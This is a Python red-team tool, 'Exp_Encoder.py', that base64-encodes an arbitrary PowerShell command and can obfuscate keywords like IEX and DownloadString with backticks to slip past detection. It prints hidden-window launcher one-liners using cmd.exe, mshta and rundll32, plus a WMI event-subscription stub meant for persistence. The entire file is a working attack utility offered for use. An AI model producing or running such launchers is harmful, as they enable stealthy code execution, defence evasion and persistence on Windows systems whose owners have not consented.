import base64
import argparse

def print_banner():
    banner = r"""
┏┓┏┓┏┓      ┓    
┃┃┗┓┣ ┏┓┏┏┓┏┫┏┓┏┓
┣┛┗┛┗┛┛┗┗┗┛┗┻┗ ┛ 
┏                
╋┏┓┏┓            
┛┗┛┛  ┓ ┓ ┏┓┏┓   
┏╋┏┓┏┓┃╋┣┓┃┃┃┃   
┛┗┗ ┗┻┗┗┛┗┗┛┣┛ 

  [🔬] Researched by d3hvck
  [+] USAGE: python3 Exp_Encoder.py -c "powershell command list but single line" -o
"""
    print(banner)

def encode_ps_command(command):
    utf16le_bytes = command.encode('utf-16le')
    b64_bytes = base64.b64encode(utf16le_bytes)
    return b64_bytes.decode()

def simple_obfuscate(command):
    replacements = {
        'powershell': 'pOwErsHeLl',
        'Invoke': 'Inv`oke',
        'DownloadString': 'Downl`oadString',
        'FromBase64String': 'Fr`omBase64String',
        'IEX': 'I`EX',
        'New-Object': 'N`ew-Object'
    }
    for k, v in replacements.items():
        command = command.replace(k, v)
    return command

def generate_payloads(encoded_command):
    print("\n[+] EncodedCommand only:")
    print(f"powershell -nop -w hidden -EncodedCommand {encoded_command}\n")

    print("[+] CMD Launcher:")
    print(f'cmd.exe /c powershell -nop -w hidden -EncodedCommand {encoded_command}\n')

    print("[+] WMI Event Consumer (for persistence):")
    print(f'powershell -c "Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments {{...}}"')
    print(f'# Use encoded command in that context: {encoded_command}\n')

    print("[+] MSHTA Launcher:")
    print(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Run(\'powershell -nop -w hidden -EncodedCommand {encoded_command}\');close();"\n')

    print("[+] RUNDLL32 Launcher:")
    print(f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write(\'<script>self.close();new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -EncodedCommand {encoded_command}");</script>\');"\n')

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="PowerShell Red Team Encoder")
    parser.add_argument("-c", "--command", required=True, help="PowerShell command to encode")
    parser.add_argument("-o", "--obfuscate", action="store_true", help="Apply keyword obfuscation")
    args = parser.parse_args()

    input_command = args.command
    if args.obfuscate:
        input_command = simple_obfuscate(input_command)

    encoded = encode_ps_command(input_command)
    generate_payloads(encoded)